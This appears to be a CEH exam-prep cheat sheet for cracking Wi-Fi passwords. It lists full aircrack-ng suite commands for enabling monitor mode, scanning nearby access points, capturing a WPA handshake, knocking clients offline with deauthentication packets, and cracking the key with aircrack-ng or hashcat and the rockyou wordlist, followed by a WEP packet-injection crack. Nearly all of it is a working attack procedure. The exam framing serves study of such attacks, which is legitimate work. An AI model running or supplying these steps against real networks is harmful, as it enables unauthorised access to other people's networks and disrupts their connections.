🔹 PHASE 1: Preparation
1️⃣ Check wireless adapter
iwconfig


✔️ Adapter should support monitor mode
Example:

wlan0  IEEE 802.11

2️⃣ Kill conflicting processes
sudo airmon-ng check kill


✔️ Stops NetworkManager, wpa_supplicant

3️⃣ Enable Monitor Mode
sudo airmon-ng start wlan0


✔️ New interface created:

wlan0mon

🔹 PHASE 2: Discover Wi-Fi Networks
4️⃣ Scan nearby APs
sudo airodump-ng wlan0mon

You will see:

BSSID → Router MAC

CH → Channel

ENC → WEP / WPA / WPA2

ESSID → Wi-Fi name

📌 Note target:

BSSID

Channel

Encryption

🔹 PHASE 3: Capture Handshake (WPA/WPA2)
5️⃣ Focus on target AP
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon


✔️ This writes:

capture-01.cap

6️⃣ Force client to reconnect (Deauth)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon


✔️ When client reconnects → Handshake captured

📌 Look for:

WPA handshake: AA:BB:CC:DD:EE:FF

🔹 PHASE 4: Crack the Password
7️⃣ Use Wordlist Attack
sudo aircrack-ng -w rockyou.txt capture-01.cap

Output:
KEY FOUND! [ password123 ]


📌 This is your answer in CEH

🔹 Alternative (Hashcat – Exam Favorite)
8️⃣ Convert cap → hccapx
cap2hccapx capture-01.cap wifi.hccapx

9️⃣ Crack with Hashcat
hashcat -m 2500 wifi.hccapx rockyou.txt

🔹 WEP Network (Quick)
Capture IVs
airodump-ng wlan0mon

Inject traffic
aireplay-ng -3 -b BSSID wlan0mon

Crack
aircrack-ng capture-01.cap

